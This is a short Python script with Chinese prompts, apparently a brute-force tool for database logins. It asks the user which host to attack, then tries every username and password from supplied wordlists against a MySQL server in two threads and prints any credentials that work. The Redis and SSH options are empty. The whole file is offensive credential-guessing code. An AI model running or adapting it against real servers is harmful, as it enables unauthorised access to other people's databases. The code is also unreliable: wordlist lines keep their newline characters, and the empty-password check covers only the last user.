# -*- coding: utf-8 -*-
"""
数据库爆破
"""

host = 'localhost'
database = 'TESTDB'
flag = False


def boom_mysql(user_list, pwd_list):
    import pymysql
    global host
    global database
    global flag

    for user in user_list:
        for pwd in pwd_list:
            # 打开数据库连接
            try:
                pymysql.connect(host=host,
                                     user=user,
                                     password=pwd,
                                     database=database)
                flag = True
                print(f"密码为：{pwd}，账户为：{user}")
            except:
                continue
    else:
        try:
            pymysql.connect(host=host,
                                 user=user,
                                 password="",
                                 database=database)
            flag = True
            print(f"mysql 账户为：{user},密码为空")
        except:
            pass
    if flag is False:
        print("爆破失败请检查您的密码本！")


if __name__ == '__main__':
    pwd_list = []
    host = input("你要攻击哪台主机？")
    database = input("输入数据库名：")

    upwd = input("请输入密码本的绝对路径：")
    with open(upwd, mode='r', encoding='utf-8') as pwd_note:
        pwd_list = pwd_note.readlines()

    opt = input("Mysql按1\tredis按2\tssh按3：")
    import threading

    if opt == "1":
        upath = input("请输入用户本的绝对路径：")
        with open(upath, mode='r', encoding='utf-8') as user_note:
            user_line = user_note.readlines()
            first_pwd = threading.Thread(target=boom_mysql, args=(user_line[:len(user_line) // 2], pwd_list))
            last_pwd = threading.Thread(target=boom_mysql, args=(user_line[len(user_line) // 2:], pwd_list))
            first_pwd.start()
            last_pwd.start()
    elif opt == "2":
        pass
    elif opt == "3":
        pass
